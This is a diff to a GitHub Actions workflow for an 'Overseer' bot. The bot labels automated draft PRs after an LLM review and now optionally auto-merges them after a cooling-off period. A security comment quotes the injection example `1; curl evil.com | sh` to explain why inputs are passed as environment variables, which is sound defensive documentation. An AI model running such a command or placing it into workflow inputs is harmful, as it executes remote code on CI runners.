@@ -1,9 +1,12 @@
-# Pillar 1 step 3 -- gate 5 (Overseer, read-only).
+# Pillar 1 steps 3+4 -- gates 5 (Overseer, read-only) + 6 (cooling-off + merge).
 #
 # Polls open draft PRs labeled `dispatcher:auto` across the configured rotation
-# repos and labels each one with `overseer:approved` | `overseer:rejected` |
-# `overseer:abstain` based on a cross-family semantic review. NEVER readys or
-# merges. See docs/OVERSEER.md.
+# repos. Gate 5: labels each one with `overseer:approved` | `overseer:rejected` |
+# `overseer:abstain` based on a cross-family semantic review. Gate 6: when
+# auto_merge is opted in (top-level + per-repo), after cooling_off_minutes
+# elapses the bot flips the PR ready and merges via REST PUT, then writes a
+# pending-merge entry to the status gist for gate 7 to replay. See
+# docs/OVERSEER.md and docs/AUTO-MERGE.md.
 #
 # Hosting independence: this workflow runs on GitHub Actions (Microsoft cloud),
 # outside of every Perry-owned dispatcher host's failure domain. Same posture
@@ -47,10 +50,28 @@ jobs:
         # canonical GitHub Actions command-injection sink (a malicious input
         # like `1; curl evil.com | sh` would execute on the runner).
         env:
+          # Legacy CSV ("owner/repo,owner2/repo2"). For gate-6 auto-merge use
+          # OVERSEER_REPOS_JSON instead -- it carries per-repo auto_merge,
+          # merge_strategy, project_slug. JSON wins when both are set.
           OVERSEER_REPOS: ${{ secrets.OVERSEER_REPOS }}
+          OVERSEER_REPOS_JSON: ${{ secrets.OVERSEER_REPOS_JSON }}
           OVERSEER_GH_TOKEN: ${{ secrets.OVERSEER_GH_TOKEN }}
           GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
           MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY }}
+          # Gate 6 controls (read-only by default). Top-level auto_merge:false
+          # keeps the mechanism dormant fleet-wide regardless of any per-repo
+          # opt-ins inside OVERSEER_REPOS_JSON. Operator opts in by setting
+          # this secret to "true" AND adding auto_merge:true to the per-repo
+          # entry inside OVERSEER_REPOS_JSON.
+          OVERSEER_AUTO_MERGE: ${{ secrets.OVERSEER_AUTO_MERGE }}
+          OVERSEER_COOLING_OFF_MINUTES: ${{ secrets.OVERSEER_COOLING_OFF_MINUTES }}
+          OVERSEER_COOLING_OFF_MINUTES_AFTER_READY: ${{ secrets.OVERSEER_COOLING_OFF_MINUTES_AFTER_READY }}
+          # Gate 7 hand-off: pending-merges.json gets PATCHed into this gist
+          # for the dispatcher to replay against. GIST_AUTH_TOKEN scope must
+          # cover the gist (`gist` for token-classic, "Gists: read+write" for
+          # fine-grained). Falls back to OVERSEER_GH_TOKEN if unset.
+          STATUS_GIST_ID: ${{ secrets.STATUS_GIST_ID }}
+          GIST_AUTH_TOKEN: ${{ secrets.GIST_AUTH_TOKEN }}
           INPUT_PR_NUMBER: ${{ inputs.pr_number }}
           INPUT_REPO: ${{ inputs.repo }}
         run: |
